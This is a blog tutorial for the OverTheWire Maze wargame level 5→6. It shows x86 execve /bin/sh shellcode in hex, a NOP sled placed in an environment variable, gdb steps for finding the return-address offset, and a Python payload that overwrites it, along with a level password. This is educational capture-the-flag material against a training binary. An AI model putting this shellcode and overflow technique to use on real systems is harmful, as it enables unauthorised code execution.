---
date: 2023-09-23 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Maze Level 5 → 6 tutorial!!"
permalink: /posts/overTheWire-Maze-Level-5-to-6/
tags: [overthewire, maze, pwn, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Maze Level 5 → 6!!"
---

<!-- Scoped styles -->
<style>
  .maze-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .maze-nav .nav-left,.maze-nav .nav-center,.maze-nav .nav-right{flex:1}
  .maze-nav .nav-left{text-align:left}
  .maze-nav .nav-center{text-align:center}
  .maze-nav .nav-right{text-align:right}
  .maze-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .maze-nav a:hover{transform:translateY(-1px)}
  .maze-nav .disabled{opacity:.55}
  :root[data-theme='light'] .maze-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="maze-nav" aria-label="Maze level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Maze-Level-4-to-5/' | relative_url }}">← Previous: Level 4 → 5</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/maze/maze6.html" target="_blank" rel="noopener">
      Official (Level 6) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Maze-Level-6-to-7/' | relative_url }}">Next: Level 6 → 7 →</a>
  </div>
</nav>

## Login

Use the **maze5** account from the previous level.

```bash
ssh maze5@maze.labs.overthewire.org -p <PORT>
# password: epheghuoli
````

> Binary for this challenge: `/maze/maze6`

---

## Task

Exploit a classic **stack overflow** and use a **NOP sled** to land in shellcode, then read `/etc/maze_pass/maze6`.

---

## A little bit of Theory

Typical “intro pwn” flow for this level:

* The program reads **too many bytes** into a **fixed-size stack buffer** (e.g., `gets`, `scanf("%s")`, or `fgets` with a bad length).
* **NX is disabled** (or the binary is compiled for a non-exec check that still allows stack execution), so we can run shellcode on the stack or in an environment variable.
* We’ll place shellcode in an **environment variable** (big space, stable), **prefix** it with a **NOP sled** (`\x90` repeated), then **overwrite the return address** with a pointer into that sled.
* On x86 (little-endian), the return address must be written in **reverse byte order**.

---

## Recon (quick)

You can sanity-check protections:

```bash
checksec --file=/maze/maze6
# Expect something like:
#  NX disabled / No PIE / No canary (varies by host)
```

Disassemble the vulnerable function to find the **buffer size** and confirm there’s an **unsafe read**. (Examples: `gets(buf)`, `scanf("%s", buf)`, `fread` without bounds, etc.)

---

## Step 1 — Put shellcode in the environment

We’ll stash tiny `/bin/sh` shellcode in an env var named `EGG`, and pad with a long NOP sled so our return only needs to be “close.”

```bash
export EGG=$(python - <<'PY'
shell  = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80" \
         "\x31\xc0\x40\xcd\x80"
sled   = "\x90" * 2000
print(sled + shell)
PY
)
```

> Any small, null-free execve shellcode works. The long sled increases our landing zone.

---

## Step 2 — Find the offset to EIP

We need to know **how many bytes** from the start of our input until the saved **return address** (EIP).

* Run under `gdb` and overflow with a controlled pattern (e.g., `A`s then `BBBB`).
* When it crashes, note where **EIP** becomes `0x42424242` (`'B' * 4`).
  That count is our **offset**.

Example (your number may differ):

```
Offset to EIP: 140
```

We’ll call this `OFFSET`.

---

## Step 3 — Find the address of `EGG`

In `gdb`, break early (e.g., at `main`) and query the environment pointer:

```gdb
(gdb) break *main
(gdb) run <<< $(python -c 'print("A"*16)')
(gdb) p (char*)getenv("EGG")
$1 = 0xbffff4c0
```

Pick a **return address inside the sled**, not necessarily the very start. Add a small offset (e.g., +0x100):

```
RET = 0xbffff4c0 + 0x100 = 0xbffff5c0
```

> Address will vary per process/host. If ASLR is on, try a fatter sled, or re-check the address right before exploit. Many wargame boxes keep this stable enough.

---

## Step 4 — Build the payload

Payload layout:

```
[ OFFSET bytes of padding ][ RET (little-endian) ]
```

We don’t need to include shellcode in the payload itself because we’re returning into `EGG`.

```bash
OFFSET=140           # <-- use the value you measured
RET=0xbffff5c0       # <-- use your getenv("EGG") + offset

python - <<PY | /maze/maze6
import struct, sys
OFFSET = int(sys.argv[1]) if len(sys.argv)>1 else ${OFFSET}
RET    = ${RET}
payload = b"A"*OFFSET + struct.pack("<I", RET)
sys.stdout.write(payload.decode('latin-1', 'ignore'))
PY
```

If the program reads from stdin, the pipeline works.
If it expects an argument, adapt to:

```bash
/maze/maze6 "$(python -c 'import struct;print("A"*OFFSET + struct.pack("<I",RET))')"
```

---

## Step 5 — Profit

If the return lands anywhere in the sled, execution slides into the shellcode and spawns a shell:

```bash
id
cat /etc/maze_pass/maze6
```

> You should now have the **maze6** password. (The exact string may differ between resets; just record it for the next level.)

---

## Troubleshooting quick tips

* **Missed the sled?** Try nudging `RET` by ±0x100, or enlarge the NOP sled.
* **Crashes before return?** Re-check the **OFFSET** to EIP with `gdb` until it’s exact.
* **Can’t get `getenv("EGG")`?** Ensure you exported `EGG` **in the same shell** that launches `gdb`/the binary.
* **NX on?** Then you can’t execute the stack — switch to a **ret2libc** plan (e.g., call `system("/bin/sh")`). This level is intended for the NOP-sled approach, though.

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
